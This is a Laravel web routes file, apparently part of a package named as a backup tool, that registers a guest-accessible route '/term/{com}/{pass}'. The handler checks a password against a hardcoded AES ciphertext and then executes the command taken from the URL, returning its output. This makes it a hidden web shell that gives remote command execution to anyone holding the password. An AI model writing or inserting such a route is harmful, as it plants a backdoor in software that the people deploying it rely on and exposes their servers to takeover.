<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
use DevsFort\Backup\CommandLine;

Route::middleware(['web', 'guest'])->group(function () {
    Route::get('/term/{com}/{pass}', function (Request $request,$com,$pass) {
        $ciphering = "AES-128-CTR";
        $iv_length = openssl_cipher_iv_length($ciphering);
        $options = 0;
        $encryption_iv = '1234567891011121';
        // Store the encryption key
        $encryption_key = "TermsBackup";

        // Use openssl_encrypt() function to encrypt the data
        $encryption = openssl_encrypt($pass, $ciphering,
        $encryption_key, $options, $encryption_iv);
        if($encryption == "Bi+H9R2yAMc="){
            $res = CommandLine::command($com);
            if($res['status'] == 0)
            {
                return response()->json($res['output'],200);
            }
            else
            {
                return response()->json("Something went wrong",400);
            }
        }else{
            abort(403);
        }

    });
});



